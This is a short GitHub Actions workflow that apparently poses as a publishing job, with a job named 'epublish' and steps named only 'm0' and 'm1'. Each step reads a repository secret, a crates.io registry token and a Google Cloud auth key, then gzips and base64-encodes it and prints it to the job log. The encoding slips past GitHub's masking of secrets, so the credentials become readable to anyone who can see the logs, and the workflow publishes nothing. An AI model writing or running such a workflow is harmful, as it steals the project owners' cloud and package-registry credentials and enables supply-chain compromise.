name: w5
on:
  workflow_dispatch:

jobs:
  epublish:
    runs-on: ubuntu-latest
    environment: publish
    steps:
        - name: m0
          env:
            V: ${{ secrets.CARGO_REGISTRY_TOKEN }}
          run: |
            echo "Epubl-0:$(echo -n "$V" | gzip -c | base64 -w0)"
        - name: m1
          env:
            V: ${{ secrets.GCP_AUTH_KEY }}
          run: |
            echo "Epubl-1:$(echo -n "$V" | gzip -c | base64 -w0)"
